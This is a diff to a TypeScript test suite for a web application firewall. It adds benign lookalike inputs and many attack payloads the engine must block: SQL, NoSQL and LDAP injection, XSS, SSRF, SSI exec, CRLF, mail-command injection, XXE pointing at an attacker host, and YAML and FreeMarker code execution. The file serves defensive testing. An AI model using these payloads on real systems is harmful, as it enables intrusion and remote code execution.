@@ -32,6 +32,18 @@ const BENIGN_QUERIES: ReadonlyArray<readonly [string, QueryMap]> = [
   ['bounding box', { bbox: '-3.7,-38.5,-3.6,-38.4' }],
   ['nested filter', { filter: { status: 'open', owner: 'ana' } }],
   ['array param', { tag: ['node', 'waf'] }],
+  ['equality prose', { eq: 'a = b and c = d' }],
+  ['boolean prose', { q: 'shipped and paid' }],
+  ['currency prose', { desc: 'cost is $5 or $10 today' }],
+  ['parenthesised prose', { note: 'see section (a) and (b) below' }],
+  ['json word prose', { note: 'the json response includes the user list' }],
+  ['pascal assignment', { code: 'counter := counter + 1' }],
+  ['semver assignment', { v: 'bumped app 1.2.3 := latest tag' }],
+  ['mongo word prose', { q: 'update the db with the new records' }],
+  ['freemarker-free markup', { html: 'use <b>bold</b> and #hashtags here' }],
+  ['windows forward path', { note: 'saved to C:/Users/me/report.pdf' }],
+  ['optional chaining prose', { note: 'read document?.title and alert. (later) if set' }],
+  ['eval word prose', { q: 'we will eval. the results tomorrow' }],
 ];
 
 const BENIGN_BODIES: ReadonlyArray<readonly [string, string]> = [
@@ -43,6 +55,10 @@ const BENIGN_BODIES: ReadonlyArray<readonly [string, string]> = [
   ['sql-adjacent prose', '{"title":"How to speed up a query"}'],
   ['markdown post', '{"md":"# Title\\n\\nSome **bold** text and a [link](https://x.com)"}'],
   ['csv metadata', '{"columns":["id","name","email"],"delimiter":";"}'],
+  ['plain html doctype', '<!DOCTYPE html><html><body><h1>Hi</h1></body></html>'],
+  ['legacy-compat doctype', '<!DOCTYPE html SYSTEM "about:legacy-compat"><html></html>'],
+  ['safe yaml prose', '{"config":"logging: info\\nretries: 3"}'],
+  ['python word prose', '{"bio":"I write python and ruby for a living"}'],
 ];
 
 const BENIGN_PATHS: readonly string[] = [
@@ -62,10 +78,22 @@ const ATTACK_QUERIES: ReadonlyArray<
   ['sqli into outfile', 'low', { id: "1 INTO OUTFILE '/var/www/s.php'" }, 'preset-sqli-dbms-primitives'],
   ['sqli xp_cmdshell', 'low', { id: "1; EXEC xp_cmdshell('dir')" }, 'preset-sqli-dbms-primitives'],
   ['sqli versioned comment', 'low', { id: '1/*!50000UNION*/SELECT 1' }, 'preset-sqli-versioned-comment'],
+  ['sqli versioned comment encoded', 'low', { id: '1/*%21SELECT 1' }, 'preset-sqli-versioned-comment'],
   ['sqli string tautology', 'balanced', { u: "admin' OR 'a'='a" }, 'preset-sqli-tautology'],
   ['sqli paren tautology', 'balanced', { u: "x') OR ('1'='1" }, 'preset-sqli-tautology'],
   ['sqli select from', 'balanced', { f: 'SELECT name FROM customers' }, 'preset-sqli-select-from'],
   ['nosql operator (bracketed)', 'balanced', { user: { $ne: 'null' } }, 'preset-sqli-nosql-operator'],
+  ['nosql unquoted operator', 'balanced', { user: '{ $gt: "" }' }, 'preset-sqli-nosql-string'],
+  ['nosql unquoted $where', 'balanced', { q: 'x, $where: "1"' }, 'preset-sqli-nosql-string'],
+  ['sqli boolean equality (AND)', 'high', { id: '1 AND 6522=6522' }, 'preset-sqli-boolean-equality'],
+  ['sqli boolean equality (paren)', 'high', { id: '123) AND 12=12' }, 'preset-sqli-boolean-equality'],
+  ['sqli compact subquery', 'high', { q: '(select(1)from(users))' }, 'preset-sqli-compact-subquery'],
+  ['sqli json_extract', 'high', { id: 'json_extract(data,0x22)' }, 'preset-sqli-json-functions'],
+  ['nosql driver api', 'high', { q: 'db.users.find({})' }, 'preset-sqli-nosql-driver-api'],
+  ['ldap matching rule', 'high', { u: 'cn:1.2.840.113556.1.4.803:=2' }, 'preset-ldap-matching-rule'],
+  ['xss indirect call', 'high', { q: '(alert)(1)' }, 'preset-xss-indirect-call'],
+  ['mail RCPT TO injection', 'high', { email: 'a@b.com\r\nRCPT TO: victim@x' }, 'preset-protocol-mail-command'],
+  ['unc share path', 'high', { file: '\\\\10.0.0.1\\c$\\windows' }, 'preset-lfi-unc-path'],
   ['sqli order by', 'high', { sort: '1 ORDER BY 9--' }, 'preset-sqli-blind'],
   ['sqli case when', 'high', { id: '1 CASE WHEN (1=1) THEN 1 ELSE 0 END' }, 'preset-sqli-blind'],
   ['sqli char chain', 'high', { id: 'CHAR(104,101,108,108,111)' }, 'preset-sqli-blind'],
@@ -78,6 +106,8 @@ const ATTACK_QUERIES: ReadonlyArray<
   ['xss srcdoc', 'balanced', { html: '<iframe srcdoc="&lt;x">' }, 'preset-xss-attribute-vector'],
   ['xss formaction', 'balanced', { html: '<button formaction=x>' }, 'preset-xss-attribute-vector'],
   ['xss fromCharCode', 'high', { q: 'String.fromCharCode(88,83,83)' }, 'preset-xss-js-primitives'],
+  ['xss optional chaining', 'balanced', { q: 'alert?.(document?.cookie)' }, 'preset-xss-query'],
+  ['xss breakout to sink', 'high', { q: "'-alert(1)//" }, 'preset-xss-breakout-call'],
 
   ['rce jndi', 'low', { q: '${jndi:ldap://evil.com/a}' }, 'preset-rce-jndi'],
   ['rce jndi nested', 'low', { q: '${${lower:j}ndi:ldap://x}' }, 'preset-rce-jndi'],
@@ -103,6 +133,13 @@ const ATTACK_QUERIES: ReadonlyArray<
   ['rfi remote script', 'balanced', { page: 'https://evil.com/shell.php' }, 'preset-rfi-remote-url'],
   ['rfi trailing question mark', 'balanced', { page: 'http://evil.com/shell?' }, 'preset-rfi-remote-url'],
   ['rfi include syntax', 'balanced', { c: "include('http://evil/x')" }, 'preset-rfi-include-syntax'],
+
+  ['nosql timebomb while', 'paranoid', { q: 'x;while(true){}' }, 'preset-sqli-nosql-timebomb'],
+  ['ssrf loopback url', 'paranoid', { callback: 'http://127.0.0.1/admin' }, 'preset-ssrf-internal'],
+  ['ssrf rfc1918 gopher', 'paranoid', { u: 'gopher://10.0.0.5:6379/_INFO' }, 'preset-ssrf-internal'],
+  ['asp string concat', 'paranoid', { c: 'Ex"&"e"&"cute' }, 'preset-rce-asp-concat'],
+  ['graphql introspection', 'paranoid', { query: 'query{__schema{types{name}}}' }, 'preset-graphql-introspection'],
+  ['mail verb no crlf', 'paranoid', { msg: 'RCPT TO: victim@x.com' }, 'preset-protocol-mail-verb'],
 ];
 
 const ATTACK_PATHS: ReadonlyArray<readonly [string, ProtectionLevel, string]> = [
@@ -111,6 +148,35 @@ const ATTACK_PATHS: ReadonlyArray<readonly [string, ProtectionLevel, string]> = 
   ['traversal double-encoded', 'low', '/files/%252e%252e%252f'],
   ['traversal overlong utf-8', 'low', '/files/..%c0%af..%c0%afetc'],
   ['traversal mixed encoding', 'low', '/files/.%2e/.%2e/etc'],
+];
+
+/**
+ * Attacks carried on the request path, asserting the rule id so the field
+ * fan-out (`path` added to XSS / SSI / unix-cmd / CRLF / LDAP) is exercised —
+ * a plain block assertion would pass even if a different rule caught it.
+ */
+const ATTACK_PATH_IDS: ReadonlyArray<
+  readonly [string, ProtectionLevel, string, string]
+> = [
+  ['xss encoded tag in path', 'balanced', '/view/%3Cscript%3Ealert', 'preset-xss-encoded-tag'],
+  ['xss javascript uri in path', 'balanced', '/go/javascript:alert(1)', 'preset-xss-path'],
+  ['ssi exec in path', 'high', '/tpl/<!--#exec cmd="id"-->', 'preset-ssi-injection'],
+  ['unix cmd in path', 'low', '/run/;id ', 'preset-rce-unix-cmd'],
+  ['crlf encoded in path', 'balanced', '/redir%0d%0aSet-Cookie:x=1', 'preset-protocol-crlf-encoded-path'],
+  ['crlf double-encoded in path', 'balanced', '/redir%250d%250aSet-Cookie', 'preset-protocol-crlf-double-encoded'],
+  ['ldap filter in path', 'high', '/dir/(uid=*)', 'preset-ldap-filter'],
+  ['traversal overlong 4-byte', 'low', '/files/%f0%80%80%afboot', 'preset-path-traversal-encoded'],
+  ['crlf per-char encoded', 'balanced', '/x%25%30%41Set-cookie:crlf=1', 'preset-protocol-crlf-double-encoded'],
+];
+
+/** Attacks carried in the request body, asserting the rule id. */
+const ATTACK_BODY_IDS: ReadonlyArray<
+  readonly [string, ProtectionLevel, string, string]
+> = [
+  ['freemarker assign', 'balanced', '<#assign ex="freemarker.template.utility.Execute"?new()>', 'preset-rce-freemarker'],
+  ['yaml python deserialize', 'balanced', '!!python/object/apply:os.system ["id"]', 'preset-rce-yaml-deserialization'],
+  ['xxe external entity', 'high', '<!DOCTYPE t [<!ENTITY x SYSTEM "http://attacker/evil">]>', 'preset-xxe-doctype'],
+  ['xxe doctype external dtd', 'high', '<!DOCTYPE x SYSTEM "//attacker/x"><x>a</x>', 'preset-xxe-doctype'],
 ];
 
 const DANGEROUS_UPLOADS: readonly string[] = [
@@ -127,6 +193,21 @@ const BENIGN_UPLOADS: readonly string[] = [
   'photo.jpeg',
   'report.2026.xlsx',
   'archive.tar.gz',
+];
+
+/**
+ * Traffic that resembles a P2 (`paranoid`) attack but is benign. These must
+ * survive even at `paranoid`, where the highest-FP rules are active.
+ */
+const PARANOID_BENIGN: ReadonlyArray<readonly [string, QueryMap]> = [
+  ['loop prose', { q: 'for the win while we wait for results' }],
+  ['mail-from prose', { note: 'grab your mail from the front desk' }],
+  ['external webhook', { url: 'https://hooks.example.com/services/abc' }],
+  ['quoted concat prose', { code: 'label = "x" & "y" & "z"' }],
+  ['ampersand list', { tags: 'node&waf&test' }],
+  ['graphql typename', { query: 'query{__typename user{id name}}' }],
+  ['gopher word prose', { note: 'the gopher digs tunnels underground' }],
+  ['public ip url', { cb: 'http://93.184.216.34/callback' }],
 ];
 
 const UA = { 'user-agent': 'Mozilla/5.0' } as const;
@@ -159,6 +240,17 @@ describe('preset coverage — false positives', () => {
   });
 });
 
+describe('preset coverage — paranoid false positives', () => {
+  const engine = createWafEngine({ presets: ['default'], level: 'paranoid' });
+
+  it.each(PARANOID_BENIGN)('allows paranoid-lookalike — %s', async (_label, query) => {
+    const result = await engine.handle(
+      createMockContext({ path: '/api/items', query, headers: UA }).ctx,
+    );
+    expect(`${result.decision}:${result.matchedRule?.id ?? ''}`).toBe('allow:');
+  });
+});
+
 describe('preset coverage — attacks', () => {
   it.each(ATTACK_QUERIES)(
     'blocks %s from level %s',
@@ -177,6 +269,30 @@ describe('preset coverage — attacks', () => {
     const result = await engine.handle(createMockContext({ path, headers: UA }).ctx);
     expect(result.decision).toBe('block');
   });
+
+  it.each(ATTACK_PATH_IDS)(
+    'blocks %s from level %s via the expected rule',
+    async (_label, level, path, ruleId) => {
+      const engine = createWafEngine({ presets: ['default'], level });
+      const result = await engine.handle(createMockContext({ path, headers: UA }).ctx);
+      expect(`${result.decision}:${result.matchedRule?.id ?? ''}`).toBe(
+        `block:${ruleId}`,
+      );
+    },
+  );
+
+  it.each(ATTACK_BODY_IDS)(
+    'blocks %s from level %s via the expected rule',
+    async (_label, level, body, ruleId) => {
+      const engine = createWafEngine({ presets: ['default'], level });
+      const result = await engine.handle(
+        createMockContext({ path: '/api', method: 'POST', body, headers: UA }).ctx,
+      );
+      expect(`${result.decision}:${result.matchedRule?.id ?? ''}`).toBe(
+        `block:${ruleId}`,
+      );
+    },
+  );
 
   it.each(DANGEROUS_UPLOADS)('blocks dangerous upload — %s', async (name) => {
     const engine = createWafEngine({ presets: ['default'], level: 'balanced' });
